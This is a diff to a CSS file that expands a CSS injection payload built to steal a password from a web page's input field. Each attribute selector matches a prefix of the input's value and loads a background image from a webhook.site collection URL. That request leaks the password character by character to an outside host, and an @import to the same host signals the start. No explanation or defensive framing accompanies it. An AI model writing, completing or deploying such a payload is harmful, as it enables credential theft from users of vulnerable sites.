@@ -1,6 +1,15 @@
+/* Start signal */
 @import url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/start");
 
-/* Guess first character of password */
+/* Guessing characters for the first position */
 input[value^="a"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/a"); }
 input[value^="b"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/b"); }
-/* Repeat for all characters in possible password */
+input[value^="c"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/c"); }
+input[value^="d"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/d"); }
+input[value^="e"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/e"); }
+/* ...continue for all characters: f–z, 0–9, symbols... */
+
+/* For second character (if first is 'a') */
+input[value^="aa"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/aa"); }
+input[value^="ab"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d/ab"); }
+/* ...repeat pattern */
